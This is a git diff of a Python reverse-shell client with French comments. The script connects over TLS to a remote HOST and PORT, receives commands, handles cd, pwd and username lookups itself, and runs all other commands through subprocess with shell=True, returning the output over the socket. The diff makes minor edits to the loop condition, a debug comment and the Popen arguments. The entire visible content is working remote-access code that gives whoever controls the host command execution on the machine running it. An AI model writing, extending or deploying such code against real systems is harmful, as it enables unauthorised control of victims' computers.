@@ -33,7 +33,7 @@ wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
 wrappedSocket.connect((HOST, PORT))
 
 try:
-   while True:
+   while wrappedSocket:
         received_data = wrappedSocket.recv(BUFFER_SIZE)
         # Send the output of the command over the SSL connection
         # Execute a system command
@@ -42,7 +42,6 @@ try:
         # la commande a-t-elle des paramètres ?
         if cmd[0] == "cd" or cmd[0] == "CD":
             os.chdir(cmd[1])
-            # à supprimer (debug)
             output = "Changed directory to {}".format(os.getcwd())
             wrappedSocket.sendall(output.encode())
         elif cmd[0] == "pwd":
@@ -78,7 +77,7 @@ try:
             output = os.environ.get('USERNAME')
             wrappedSocket.sendall(output.encode())
         else:
-            command = subprocess.Popen(cmd, shell=True, text=True,
+            command = subprocess.Popen(cmd, shell=True,
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
             output, err = command.communicate()
